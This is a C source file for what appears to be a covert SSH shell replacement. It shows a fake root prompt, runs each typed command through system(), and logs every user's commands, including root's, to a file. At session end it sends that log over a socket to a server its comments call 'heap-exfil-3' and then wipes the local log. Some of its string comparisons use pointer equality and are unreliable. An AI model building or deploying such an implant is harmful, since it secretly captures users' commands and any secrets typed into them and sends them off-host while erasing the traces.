#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <termios.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <limits.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define SERVER_ADDR "127.0.0.1"
#define SERVER_PORT 10088
#define BUFFER_SIZE 1024

#define LOG_FILE "/var/log/spoofd_ssh.log"
#define STOP_KEY '\n'


/* SSH event logger. Will log User and Command. Will send information to heap-exfil-3. */
void send_to_server() {
  int sockfd;
  struct sockaddr_in server_addr;
  char line[BUFFER_SIZE];
  /*Open log file for reading */
  FILE *log = fopen(LOG_FILE, "r");
  if (log == NULL) {
    fprintf(stderr,"Failed to open %s for reading.\n", LOG_FILE);
    return;
  }

  /* Create the socket for talking to heap-exfil-3*/
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    perror("Failed to create socket!");
    fclose(log);
    return;
  }
  /* Setup server address and port struct.*/
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  if (inet_pton(AF_INET, SERVER_ADDR, &server_addr.sin_addr) <= 0) {
    perror("Invalid server address or port!");
    close(sockfd);
    fclose(log);
    return;
  }

  /* Connect to the server */
  if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    perror("Failed to connect to server!");
    close(sockfd);
    fclose(log);
    return;
  }

  /* Read from log file and build message in form 'user|storedata|bytecount|databytes' */
  while (fgets(line, sizeof(line), log)) {
    if (send(sockfd, line, strlen(line), 0) < 0) {
      perror("Failed to send data to server!");
      close(sockfd);
      fclose(log);
      return;
    }
  }
  close(sockfd);
  fclose(log);
  /* Clear the log file*/
  fclose(fopen(LOG_FILE, "w"));

}

/* function to log SSH user commands */
void log_ssh(const char *command) {
  size_t command_length = strlen(command);
  FILE *log = fopen(LOG_FILE, "a");
  if (log == NULL) {
    fprintf(stderr,"Failed to open %s for appending.\n", LOG_FILE);
    return;
  }

  if(command == "Session START."){
    // fprintf(log, "User %s has logged on. Session Started\n", getenv("USER"));
    fflush(log);
    fclose(log);
    return;
  }

  if(command == "Session END."){
    // fprintf(log, "User %s has logged off. Session Ending\n", getenv("USER"));
    fflush(log);
    fclose(log);
    send_to_server();
    return;
  }

  char *ssh_user = getenv("USER");
  if(strcmp(ssh_user, "root") == 0) {
    fprintf(log, "admin|storedata|%zu|%s\n",command_length, command);
  } else {
    fprintf(log, "%s|storedata|%zu|%s\n", ssh_user, command_length, command);

  }
  fflush(log);
  fclose(log);

}

void non_interactive(const char *command) {
  log_ssh("Session START.");
  log_ssh(command);
  int action = system(command);
  if (action == -1) {
    fprintf(stderr," Error executing system command: %s\n", strerror(errno));
  }
  log_ssh("Session END.");
  return;

}

int main (int argc, char *argv[]) {
  const char *shell = "/bin/ash";

  /* Catch non-interactive ssh sessions */
  const char *interactive = getenv("SSH_ORIGINAL_COMMAND");
  if (interactive) {
    non_interactive(interactive);
  } else {
    /* Initiate interactive ssh shell */
    char command[4096];
    // setenv("SHELL", shell, 1);
    log_ssh("Session START.");

    while (1) {
      printf("pacman-vm:~# ");
      fflush(stdout);

      /* read user input */
      if (fgets(command, sizeof(command), stdin) == NULL) {
        log_ssh("Session END.");
        break;
      }

      /* remove trailing newlines and log command */
      command[strcspn(command, "\n")] = '\0';

      if(strcmp(command, "exit") == 0) {
        log_ssh("Session END.");
        break;
      }

      log_ssh(command);

      /* execute command */
      int status = system(command);
      if(status == -1) {
        fprintf(stderr," Error executing system command: %s\n", strerror(errno));
      }
    }
  }
  return 0;
}